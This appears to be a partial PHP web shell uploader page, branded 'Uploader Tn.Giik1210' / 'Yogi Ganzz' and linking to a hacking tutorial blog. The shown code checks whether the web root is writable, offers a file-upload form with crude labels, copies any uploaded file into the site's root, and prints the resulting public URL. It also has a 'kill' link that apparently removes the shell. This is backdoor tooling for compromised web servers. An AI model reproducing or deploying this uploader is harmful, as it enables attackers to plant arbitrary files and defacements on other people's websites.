...
<html>
<head>
<title>Uploader Tn.Giik1210</title>	
<style type='text/css'>
...
<center>
<img src="https://b.top4top.io/p_1871m44x90.png" width="370px" height="370px"><br>
<font color='white' size="6">- </font><font color='blue' size="8">Uploader Yogi Ganzz</font><font color='white' size="6"> -</font><br>
<body bgcolor="black">
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
...
echo "&nbsp;<a href='https://hackingtutorgiik.blogspot.com' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>B L O G</a>&nbsp;<a href='?c7e=kill' style='border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?bye=logout' style='color:red;border:2px solid #0000ff;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='file'>
<input type='submit' value='Crot Ah :)' name='upload'>
</form>";
...
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['file']['tmp_name'], $dest)) {
			...
			echo "Ahhh Pelan Pelan Crot Nya Yang :(  <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
